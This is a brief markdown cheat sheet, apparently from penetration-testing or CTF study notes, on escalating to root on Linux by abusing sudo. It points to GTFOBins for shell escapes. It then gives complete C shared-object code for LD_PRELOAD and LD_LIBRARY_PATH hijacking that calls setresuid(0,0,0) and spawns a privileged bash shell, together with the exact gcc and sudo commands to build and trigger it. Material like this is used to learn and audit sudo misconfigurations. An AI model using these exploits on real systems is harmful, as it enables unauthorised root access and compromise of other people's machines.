# Sudo

## Shell Escape Sequences

- List the programs which sudo allows your user to run:

	```
	sudo -l
	```
	
- [https://gtfobins.github.io](https://gtfobins.github.io)

## Environment Variables

### LD_PRELOAD

1. Check which environment variables are inherited (look for the env_keep options):

	```
	sudo -l
	```

2. Create a C file using the code (e.g. preload.c):
	
	```
	#include <stdio.h>
	#include <sys/types.h>
	#include <stdlib.h>

	void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
	}
	```

3. Create a shared object using the C program

	```
	gcc -fPIC -shared -nostartfiles -o /tmp/preload.soÂ /home/user/tools/sudo/preload.c
	```

4. Run one of the programs you are allowed to run via sudo, while setting the LD_PRELOAD environment variable to the full path of the new shared object:

	```
	sudo LD_PRELOAD=/tmp/preload.so program-name-here
	```
	
### LD_LIBRARY_PATH

1. Run ldd against the program file to see which shared libraries are used by the program:
	
	```
	ldd /usr/sbin/apache2
	```

2. Create a C file using the code (e.g. library_path.c):
	
	```
	#include <stdio.h>
	#include <stdlib.h>

	static void hijack() __attribute__((constructor));

	void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
	}

	```

3. Create a shared object with the same name as one of the listed libraries using the C code

	```
	gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
	```


4. Run the program using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):

	```
	sudo LD_LIBRARY_PATH=/tmp program-name-here
	```